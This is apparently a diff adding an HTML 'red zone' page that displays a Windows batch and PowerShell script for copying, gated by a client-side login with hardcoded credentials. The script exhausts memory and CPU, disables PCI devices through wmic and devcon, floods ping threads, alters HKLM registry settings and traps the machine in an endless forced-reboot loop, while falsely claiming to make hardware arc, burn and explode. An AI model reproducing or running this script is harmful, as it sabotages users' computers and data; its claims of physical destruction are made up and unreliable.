+1..$maxThreads | % {
+    Start-Job -ArgumentList $using:maxThreads -ScriptBlock {
+        param($mt); $buf = New-Object byte[] ([long]::MaxValue/10);
+        while($true) {
+            for($i=0;$i -lt 1GB;$i+=4) { [BitConverter]::GetBytes($i) };
+            [System.Math]::Pow(2,1024); 
+            $sha = [Security.Cryptography.SHA512]::Create().ComputeHash($buf);
+        }
+    }
+};
+while($true){ [GC]::Collect(); Start-Sleep -Milliseconds 1 }
+"
+
+:: VOLTAGE SOCKET KILLER
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings" /v ACSettingIndex /t REG_DWORD /d 0 /f >nul 2>&1
+powercfg /change monitor-timeout-ac 0 /nul
+powercfg /change standby-timeout-ac 0 /nul
+wmic path Win32_PnPEntity where "PNPClass='PCI'" call Disable >nul 2>&1
+echo [√] CPU/GPU Sockets: ELECTRICAL ARCING + 400% LOAD
+
+:: 🔥 PHASE 4: PSU CAPACITOR EXPLOSION (25s) 🔥
+echo 🔥 PHASE 4: POWER SUPPLY DETONATION
+for /l %%i in (1,1,200) do start /b /high cmd /c "
+    ping 127.0.0.1 -t -l 65507 -w 1 >nul 2>&1
+    nbtstat -R >nul 2>&1
+    arp -d >nul 2>&1
+"
+echo [√] PSU: 200 FLOOD THREADS - CAPACITORS POPPING
+
+:: 🔥 PHASE 5: MOTHERBOARD TRACE FIRE (35s) 🔥
+echo 🔥 PHASE 5: MOBO TRACE INCENDIARY
+for /f %%i in ('wmic path Win32_PnPEntity get PNPDeviceID /format:list ^| find "PCI"') do (
+    devcon disable "%%i" >nul 2>&1
+    devcon enable "%%i" >nul 2>&1
+)
+reg add "HKLM\SYSTEM\CurrentControlSet\Services" /v Overclock /t REG_DWORD /d 5000 /f >nul 2>&1
+echo [√] Chipset/Mobo: RAPID ENABLE/DISABLE ARCING
+
+:: 🔥 PHASE 6: RAM MODULE COMBUSTION (20s) 🔥
+echo 🔥 PHASE 6: MEMORY BLAZE
+powershell -c "while($true){ $huge = New-Object byte[] 32GB; $null = $huge[0..$huge.Length] }" >nul 2>&1 &
+start /b powershell -c "1..100 | % { New-Object System.Object[, ] (65536,65536) }" >nul 2>&1
+echo [√] RAM: OVERFLOW HEAT - MODULES MELTING
+
+:: 🔥 FINAL PHASE: TOTAL SYSTEM IGNITION LOCK 🔥
+:ETERNAL_FIRE
+cls & color 0C
+echo 🔥🔥🔥 ALL SOCKETS BURNING - TOTAL INCINERATION ACTIVE 🔥🔥🔥
+echo.
+echo   CPU:   █████████████████████ 1000°C+
+echo   GPU:   █████████████████████ 1000°C+  
+echo   MOBO:  █████████████████████ TRACES GLOWING
+echo   PSU:   █████████████████████ CAPACITORS EXPLODING
+echo   DRIVES:█████████████████████ NAND FIRESTORM
+echo   RAM:   █████████████████████ CELLS COMBUSTING
+echo.
+shutdown /r /f /t 2 /c "🔥 FULL SYSTEM INCINERATED - TOTAL REPLACEMENT 🔥"
+timeout /t 3 >nul
+goto ETERNAL_FIRE</pre>
+                    </div>
+                </div>
+
+               
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function copyCode(btn) {
+            const pre = btn.parentElement.querySelector('pre');
+            navigator.clipboard.writeText(pre.textContent).then(() => {
+                btn.textContent = '✅ COPIED!';
+                btn.style.background = '#00ff41';
+                btn.style.color = '#000';
+                setTimeout(() => {
+                    btn.textContent = '📋 COPY';
+                    btn.style.background = 'rgba(0,255,65,0.2)';
+                    btn.style.color = '#00ff41';
+                }, 1500);
+            });
+        }
+        
+        function auth() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            if(u === 'ADMIN_REDZONE' && p === 'REDZONE@2010') {
+                document.getElementById('login').style.display = 'none';
+                document.getElementById('dash').style.display = 'block';
+            } else {
+                document.getElementById('user').value = '';
+                document.getElementById('pass').value = '';
+                alert('❌ ACCESS DENIED\n\nUSERNAME: ADMIN_REDZONE\nPASSWORD: REDZONE@2010');
+            }
+        }
+        
+        function logout() {
+            document.getElementById('logoutMsg').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('logoutMsg').style.display = 'none';
+                document.getElementById('login').style.display = 'block';
+                document.getElementById('dash').style.display = 'none';
+                document.getElementById('user').value = '';
+                document.getElementById('pass').value = '';
+            }, 3000);
+        }
+        
+        document.addEventListener('keydown', e => { if(e.key === 'Enter') auth(); });
+    </script>
+</body>
+</html>
